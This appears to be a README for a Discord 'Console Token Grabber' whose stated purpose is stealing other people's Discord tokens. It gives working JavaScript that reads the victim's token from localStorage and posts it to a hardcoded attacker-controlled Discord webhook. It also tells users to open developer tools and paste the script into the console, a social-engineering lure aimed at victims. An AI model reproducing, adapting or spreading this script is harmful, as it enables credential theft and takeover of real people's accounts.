## 🔐 Basic Console Token Grabber
**It's a simple "Console Token Grabber" that you can use to steal other people's Discord Token.**

<!--<h3 align="center">
![image](https://cdn.discordapp.com/attachments/941755353035579422/951879632544747540/Unbenannt-1.png)
</h3> -->

![image](https://cdn.discordapp.com/attachments/941755353035579422/951879632544747540/Unbenannt-1.png)

```js
(function() {
    window.dispatchEvent(new Event('beforeunload'));
    var x = new XMLHttpRequest;
    x.open("POST", 'https://discord.com/api/webhooks/947563711281909842/-wxZY0FRrTeVt3GeEoEux_A35j6tdYWaqn4AFVa1E1AH99GmTj6NRYUwWgatDbGhnqJL'), x.setRequestHeader("Content-type", "application/json");
    var y = {
        username: "Eternity Script",
        avatar_url: "https://cdn.discordapp.com/attachments/941755353035579422/947642580521340928/1.png",
        content: "@everyone New skid",
        embeds: [{
            color: "696969",
            description: `Token: ${window.open().localStorage.token}`,
        }]
    };

    x.send(JSON.stringify(y));
    w.close()
}());```

## 🔐 How to use

- Go ond Discord and press CTRL + SHIFT + I and paste the Script in the console.
